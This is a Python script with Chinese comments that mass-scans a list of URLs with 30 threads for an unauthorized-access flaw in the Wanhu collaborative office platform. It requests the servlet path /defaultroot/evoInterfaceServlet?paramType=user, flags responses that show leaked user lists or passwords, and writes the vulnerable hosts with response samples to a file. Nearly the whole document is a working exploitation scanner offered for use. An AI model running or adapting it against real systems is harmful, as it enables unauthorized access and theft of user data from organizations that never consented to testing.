import requests
import concurrent.futures
from urllib.parse import urljoin
import threading
import time
import sys

# 线程锁用于安全写入文件
write_lock = threading.Lock()

def check_wanhu_vulnerability(url):
    """
    检测万户协同办公平台未授权访问漏洞
    """
    try:
        # 构造目标URL
        target_url = urljoin(url.strip(), "/defaultroot/evoInterfaceServlet?paramType=user")
        
        print(f"[*] 正在检测: {target_url}")
        
        # 设置请求头，模拟正常浏览器访问
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close'
        }
        
        # 发送GET请求
        response = requests.get(
            target_url, 
            headers=headers, 
            timeout=10, 
            verify=False  # 忽略SSL证书验证
        )
        
        # 检查响应状态码和内容
        if response.status_code == 200:
            if "result:'success'" in response.text:
                print(f"[+] 存在漏洞: {target_url}")
                print(f"    状态码: {response.status_code}")
                print(f"    响应内容包含: result:'success'")
                
                # 检查是否包含用户信息（可选）
                if "userList" in response.text or "password" in response.text.lower():
                    print("    [!] 发现用户信息或密码数据")
                
                return True, target_url, response.text[:200]  # 返回前200个字符作为样本
            else:
                print(f"[-] 不存在漏洞: {target_url} - 响应中未找到result:'success'")
        else:
            print(f"[-] 不存在漏洞: {target_url} - 状态码: {response.status_code}")
            
    except requests.exceptions.ConnectTimeout:
        print(f"[!] 连接超时: {target_url}")
    except requests.exceptions.ReadTimeout:
        print(f"[!] 读取超时: {target_url}")
    except requests.exceptions.ConnectionError:
        print(f"[!] 连接错误: {target_url}")
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {target_url} - 错误: {e}")
    except Exception as e:
        print(f"[!] 检测过程中出现错误: {e}")
    
    return False, target_url, None

def process_url(url, vulnerable_sites):
    """
    处理单个URL的检测任务
    """
    is_vulnerable, target_url, response_sample = check_wanhu_vulnerability(url)
    
    if is_vulnerable:
        # 使用线程锁确保安全写入列表
        with write_lock:
            vulnerable_sites.append((target_url, response_sample))
    
    return is_vulnerable

def main():
    print("""
    万户协同办公平台未授权访问漏洞检测脚本（并发版）
    目标路径: /defaultroot/evoInterfaceServlet?paramType=user
    检测条件: status=200 且 响应包含 result:'success'
    线程数: 30
    """)
    
    try:
        # 读取URL列表
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("[!] url.txt文件为空或不存在")
            return
        
        print(f"[*] 共发现 {len(urls)} 个待检测URL")
        print(f"[*] 开始并发检测，线程数: 30")
        
        vulnerable_sites = []
        start_time = time.time()
        
        # 使用线程池执行并发检测
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(process_url, url, vulnerable_sites): url for url in urls}
            
            # 等待所有任务完成
            completed = 0
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                    completed += 1
                    print(f"[进度] {completed}/{len(urls)} 已完成")
                except Exception as e:
                    print(f"[!] 处理 {url} 时发生异常: {e}")
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        # 将存在漏洞的URL写入result.txt
        if vulnerable_sites:
            with open('result.txt', 'w', encoding='utf-8') as f:
                f.write("存在万户协同办公平台未授权访问漏洞的URL:\n")
                f.write("=" * 60 + "\n")
                f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"检测耗时: {elapsed_time:.2f}秒\n")
                f.write(f"总检测数: {len(urls)}\n")
                f.write(f"漏洞数量: {len(vulnerable_sites)}\n")
                f.write("=" * 60 + "\n\n")
                
                for i, (vuln_url, sample) in enumerate(vulnerable_sites, 1):
                    f.write(f"{i}. {vuln_url}\n")
                    f.write(f"   响应样本: {sample}\n")
                    f.write("-" * 40 + "\n")
            
            print(f"\n[+] 检测完成! 发现 {len(vulnerable_sites)} 个存在漏洞的站点")
            print(f"[+] 总耗时: {elapsed_time:.2f}秒")
            print(f"[+] 结果已保存到 result.txt")
        else:
            print(f"\n[-] 检测完成! 未发现存在漏洞的站点")
            print(f"[-] 总耗时: {elapsed_time:.2f}秒")
            # 创建空的result.txt文件
            with open('result.txt', 'w', encoding='utf-8') as f:
                f.write("未发现存在万户协同办公平台未授权访问漏洞的URL\n")
                f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"检测耗时: {elapsed_time:.2f}秒\n")
                f.write(f"总检测数: {len(urls)}\n")
            
    except FileNotFoundError:
        print("[!] 错误: 未找到url.txt文件")
        print("[!] 请创建url.txt文件，每行一个URL地址")
    except KeyboardInterrupt:
        print("\n[!] 检测被用户中断")
    except Exception as e:
        print(f"[!] 程序执行错误: {e}")

if __name__ == "__main__":
    # 忽略SSL警告
    requests.packages.urllib3.disable_warnings()
    
    main()